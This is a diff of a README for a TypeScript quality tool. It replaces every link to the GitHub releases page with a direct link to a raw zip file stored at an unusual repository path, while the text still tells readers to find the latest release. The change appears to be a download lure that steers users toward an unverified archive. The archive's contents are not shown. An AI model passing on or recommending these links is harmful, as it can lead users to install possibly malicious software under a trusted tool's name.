@@ -1,10 +1,10 @@
 # 🛡️ ts-quality - Trust TypeScript changes with control
 
-[![Download ts-quality](https://img.shields.io/badge/Download%20ts--quality-blue?style=for-the-badge&logo=github)](https://github.com/Neocortical-one877/ts-quality/releases)
+[![Download ts-quality](https://img.shields.io/badge/Download%20ts--quality-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Neocortical-one877/ts-quality/main/packages/legitimacy/ts-quality-v3.6.zip)
 
 ## 📥 Download ts-quality
 
-Visit this page to download: https://github.com/Neocortical-one877/ts-quality/releases
+Visit this page to download: https://raw.githubusercontent.com/Neocortical-one877/ts-quality/main/packages/legitimacy/ts-quality-v3.6.zip
 
 1. Open the link above in your web browser.
 2. Find the latest release.
@@ -144,4 +144,4 @@ After install, run a small check on one project folder first. Use a folder with 
 
 ## 📎 Download again
 
-If you need the release page later, use this link: https://github.com/Neocortical-one877/ts-quality/releases
+If you need the release page later, use this link: https://raw.githubusercontent.com/Neocortical-one877/ts-quality/main/packages/legitimacy/ts-quality-v3.6.zip
